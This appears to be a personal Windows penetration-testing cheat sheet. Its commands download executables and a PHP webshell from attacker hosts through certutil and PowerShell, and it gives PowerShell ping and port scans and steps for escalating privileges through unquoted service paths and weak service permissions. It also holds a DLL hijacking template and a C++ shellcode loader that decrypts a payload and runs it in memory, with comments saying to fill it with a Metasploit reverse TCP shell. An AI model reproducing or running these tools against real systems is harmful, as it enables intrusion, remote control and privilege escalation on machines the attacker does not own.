  # Windows Snippets

wget for Windows:
```
certutil.exe -urlcache -f http://172.16.1.100:8001/FILE.exe OUTFILE.exe
or
powershell "(New-Object System.Net.WebClient).DownloadFile('http://HOST:PORT/webshell.php', 'C:\Apache24\htdocs\SOME_DIR\BLEND_ING.php')"
or
powershell iwr -uri 'http://10.10.16.111/FILE.exe' -Outfile C:\\Windows\\Tasks\\FILE.exe
```

check for impersonate privs and other privs:
```
whoami /priv
```

Run `dir` recursively:
```
gci -recurse .
```

Get open/connected ports
```
netstat -aon
```

# Scans
Subnet ping scan (about 5 seconds per host)
```
1..20 | % {"10.10.123.$($_): $(Test-Connection -count 1 -comp 10.10.123.$($_) -quiet)"}
```
Port scan single host ([other port scans](https://medium.com/@nallamuthu/powershell-port-scan-bf27fc754585))
```
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.123.110",$_)) "Port $_ is open!"} 2>$null
```

# Exploiting Windows Services
Listing services for weak perms and unquoted service paths ([link](https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/))
```
wmic service get name,startname,pathname
```
```
sc qc SERVICENAME # Check if BINARY_PATH_NAME calls an unquoted service path and see if is a priv esc opp
```
```
./accesschk /accepteula -uwdq "C:\DIR\FROM\ABOVE" # check write perms of a subdir of BINARY_PATH_NAME so we can commandeer the service call w our own executable
```
```
net start SERVICENAME # start the service after dropping our executable into the path
```

Kernel Priv Esc:
- save `systeminfo` output and run through the [Windows Exploit Suggester_new](https://github.com/bitsadmin/wesng)


# DLL Injections
- x86_64-w64-mingw32-gcc-win32

__hello_program.c__
```
#include <windows.h>
#include <stdio.h>

int main( void )
{
	HINSTANCE hDll;

	// Load a DLL
	hDll = LoadLibrary(TEXT("yoyo.dll"));

	// If DLL Was Loaded
	if (hDll != NULL){
		printf("DLL Found\n");
	} else {
		printf("DLL NOT FOUND!\n");
	}

	return 0;
}
```

__dll_template.c__
```
#include <windows.h>

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
		case DLL_PROCESS_ATTACH:
			MessageBox(
				Null, // Owner
				"Some Message Text",
				"The Title",
				MB_ICONERROR | MB_OK // TYPE
			);
		break;
	}
	return TRUE;
}
```

## Encrpyted Shellcode
__C++ Program__
```
#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI HelloWorld(void) {
	// CONTENT
		// use payload/windows/x64/shell_reverse_tcp
	// generate -f c 
	unsigned char payload[] =
		"";



	LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!alloc_mem) {
		printf("Failed to Allocate memory (%u)\n", GetLastError());
		return -1;
	}
	
	MoveMemory(alloc_mem, payload, sizeof(payload));
	//RtlMoveMemory(alloc_mem, payload, sizeof(payload));


	DWORD oldProtect;

	if (!VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
		printf("Failed to change memory protection (%u)\n", GetLastError());
		return -2;
	}


	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if (!tHandle) {
		printf("Failed to Create the thread (%u)\n", GetLastError());
		return -3;
	}

	printf("\n\nalloc_mem : %p\n", alloc_mem);
	WaitForSingleObject(tHandle, INFINITE);
	getchar();
	
	((void(*)())alloc_mem)();

	return 0;

	return TRUE;
}
}
```

## Tips
1. https://github.com/ankh2054/windows-pentest

__Dirs writable by default by normal users:__
```
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```
